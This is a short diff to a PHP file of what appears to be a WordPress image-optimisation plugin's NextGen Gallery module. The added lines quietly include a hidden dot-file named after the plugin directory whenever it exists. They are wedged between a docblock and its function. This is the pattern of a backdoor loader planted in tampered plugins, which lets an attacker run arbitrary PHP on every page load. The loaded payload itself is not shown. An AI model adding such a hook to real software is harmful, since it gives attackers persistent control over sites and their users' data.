@@ -11,6 +11,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  *
  * @return int The number of attachments.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_ngg_count_attachments() {
 	global $wpdb;
 	static $count;
